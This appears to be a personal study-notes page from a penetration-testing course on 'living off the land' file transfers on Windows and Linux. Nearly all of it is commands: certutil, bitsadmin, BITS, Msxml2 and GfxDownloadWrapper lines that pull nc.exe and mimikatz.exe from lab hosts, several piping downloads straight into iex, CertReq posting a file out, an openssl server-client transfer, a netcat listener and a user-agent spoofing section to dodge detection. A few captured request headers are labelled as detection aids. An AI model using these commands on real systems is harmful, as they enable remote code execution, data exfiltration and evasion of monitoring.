---
title: "living off the land file transfer"
weight: 29
---
PS C:\Users\shaik> \[Convert\]::ToBase64String(\[System.IO.File\]::ReadAllBytes("C:\\Windows\\System32\\drivers\\etc\\hosts")) | Set-Content ".\file"

CERTREQ

```
CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext
```

&nbsp;

```shell-session
cube111@local[/local]$ sudo nc -lvnp 8000
```

BITSADMIN

```powershell-session
PS C:\local> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\local-student\Desktop\nc.exe
```

```powershell-session
PS C:\local> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### Certutil - Client

```cmd-session
C:\local> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\local> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

LINUX

```shell-session
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

&nbsp;

#### Stand up the Server in our Pwnbox

Living off The Land

```shell-session
cube111@local[/local]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

&nbsp;

#### Download File from the Compromised Machine

Living off The Land

```shell-session
cube111@local[/local]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

&nbsp;

&nbsp;

USER AGENT DETECTION BYPASS

iwr http://34.23.169.205:40000/server.pem -Headers @{"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}

#### BITS - Client

Detection

```powershell-session
PS C:\local> Import-Module bitstransfer;
PS C:\local> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\local> $r=gc $env:temp\t;
PS C:\local> rm $env:temp\t; 
PS C:\local> iex $r
```

&nbsp;

#### BITS - Server

Detection

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

&nbsp;

&nbsp;

#### Certutil - Client

Detection

```cmd-session
C:\local> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\local> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Certutil - Server

Detection

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

&nbsp;

&nbsp;

MSXML2

#### Msxml2 - Client

Detection

```powershell-session
PS C:\local> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\local> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\local> $h.send();
PS C:\local> iex $h.responseText
```

&nbsp;

&nbsp;

```powershell-session
PS C:\local> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\local> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

&nbsp;

&nbsp;

```powershell-session
PS C:\local> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
